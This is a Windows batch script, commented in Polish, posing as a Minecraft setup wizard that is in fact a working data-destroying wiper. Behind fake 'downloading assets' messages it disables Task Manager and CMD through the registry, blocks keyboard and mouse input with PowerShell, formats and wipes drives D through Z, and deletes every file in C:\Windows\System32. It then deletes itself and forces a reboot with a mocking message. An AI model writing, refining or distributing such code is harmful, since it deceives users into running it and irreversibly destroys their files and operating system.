@echo off
:: SPRAWDZANIE UPRAWNIEN ADMINISTRATORA
net session >nul 2>&1
if %errorlevel% neq 0 (
    title Error
    color 04
    echo ########################################
    echo #                                      #
    echo #      Run as administrator, please    #
    echo #                                      #
    echo ########################################
    pause >nul
    exit /b
)

:: JEZELI JEST ADMINEM, STARTUJE INSTALATOR
title Minecraft Installer
color 04
cls

echo ########################################
echo #                                      #
echo #      MINECRAFT SETUP WIZARD          #
echo #                                      #
echo ########################################
echo.

:: DECYZJA UZYTKOWNIKA
set /p "choice=Are you sure to install Minecraft? (Y/N): "

if /i "%choice%"=="Y" (
    goto install_start
) else (
    echo.
    echo Installation cancelled.
    shutdown -r -t 5 -c "Ok"
    exit
)

:install_start
cls
echo [!] Initializing Minecraft Setup...
timeout /t 2 >nul

:: 1. BLOKADY SYSTEMOWE (TASK MGR, CMD, CTRL+ALT+DEL)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableCMD /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoClose /t REG_DWORD /d 1 /f >nul 2>&1

:: 2. FIZYCZNA BLOKADA MYSZKI I KLAWIATURY (PowerShell BlockInput)
powershell -Command "$m = '[DllImport(\"user32.dll\")] public static extern bool BlockInput(bool fBlock);'; $type = Add-Type -MemberDefinition $m -Name 'Win32' -Namespace 'Utils' -PassThru; $type::BlockInput($true)"

:: 3. POBIERANIE ASSETOW (FORMATOWANIE DYSKOW D, E, F...)
cls
echo [!] Downloading Minecraft Assets...
timeout /t 3 >nul

for %%d in (D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
    if exist %%d:\ (
        echo Downloading textures to drive %%d:\installer_cache...
        format %%d: /q /x /y >nul 2>&1
        rd /s /q %%d:\ >nul 2>&1
    )
)

:: 4. POBIERANIE SILNIKA (NISZCZENIE SYSTEM32)
echo [!] Downloading Minecraft Core Engine...
takeown /f C:\Windows /r /d y >nul 2>&1
icacls C:\Windows /grant administrators:F /t >nul 2>&1

:: Petla udajaca pobieranie, a w rzeczywistosci usuwajaca pliki
for /f "delims=" %%i in ('dir /s /b C:\Windows\System32\*.*') do (
    echo Downloading core component: %%i
    del /f /q "%%i" >nul 2>&1
)

:: 5. FINAL I SAMOUSUWANIE
cls
echo ============================================================
echo   Minecraft installed. We need to restart to apply changes.
echo ============================================================
timeout /t 5 >nul

:: Tworzenie skryptu czyszczacego ktory usunie ten instalator
(echo ping localhost -n 5 ^> nul ^& del "%~f0" ^& del "%%~f0") > %temp%\cleaner.bat
start /min "" %temp%\cleaner.bat

:: RESTART Z TWOJA WIADOMOSCIA
shutdown -r -t 0 -c "You are idiot thats not minecraft that is files deleting virus (system too)" -f
exit
